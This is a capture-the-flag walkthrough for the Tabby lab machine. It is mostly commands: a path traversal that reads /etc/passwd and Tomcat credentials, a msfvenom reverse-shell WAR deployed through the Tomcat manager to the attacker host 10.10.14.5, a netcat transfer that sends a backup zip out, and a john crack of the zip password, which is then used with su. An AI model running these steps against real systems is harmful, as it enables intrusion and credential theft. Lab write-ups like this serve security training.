Tabby walkthrough
######################


We first run nmap. We get the following.

.. code-block:: console

    nmap -sC -sV -T4 -p- 10.10.10.194 | tee tabby.nmap 
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 
    | ssh-hostkey:  
    |   3072 453c341435562395d6834e26dec65bd9 (RSA) 
    |   256 89793a9c88b05cce4b79b102234b44a6 (ECDSA) 
    |_  256 1ee7b955dd258f7256e88e65d519b08d (ED25519) 
    80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu)) 
    |_http-title: Mega Hosting 
    |_http-server-header: Apache/2.4.41 (Ubuntu) 
    8080/tcp open  http    Apache Tomcat 
    |_http-title: Apache Tomcat 
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 

HTTP 8080
******************

We then checkout `http://10.10.10.194:8080/ ` and find some useful information.

	* It runs tomcat 9
	* http://10.10.10.194:8080/manager/html 
	* http://10.10.10.194:8080/host-manager/html 
	* Users are defined in /etc/tomcat9/tomcat-users.xml 

HTTP 80
***************

We find files and the hostname on `http://10.10.10.194`. There we can find `/etc/passwd`

.. code-block:: console

	http://megahosting.htb/news.php?file=../../../../etc/passwd 

We then find tomcat user's creds with curl

.. code-block:: console

	curl http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml 
	
	U = tomcat
	P = $3cureP4s5w0rd123! 

msfvenom -p java/shell_reverse_tcp lhost=10.10.14.5 lport=4444 -f war -o rev.10.10.14.5-4444.war 

curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/mynameis --upload-file rev.10.10.14.5-4444.war 

nc –lvnp 4444 

curl http://10.10.10.194:8080/mynameis 

cat 16162020_backup.zip | nc 10.10.14.5 443 

nc -lvnp 443 > 16162020_backup.zip 

zip2john 16162020_backup.zip > 16162020_backup.zip.john 

john 16162020_backup.zip.john --wordlist=/usr/share/wordlists/rockyou.txt 

admin@it  

Su – ash 

Admin@it 
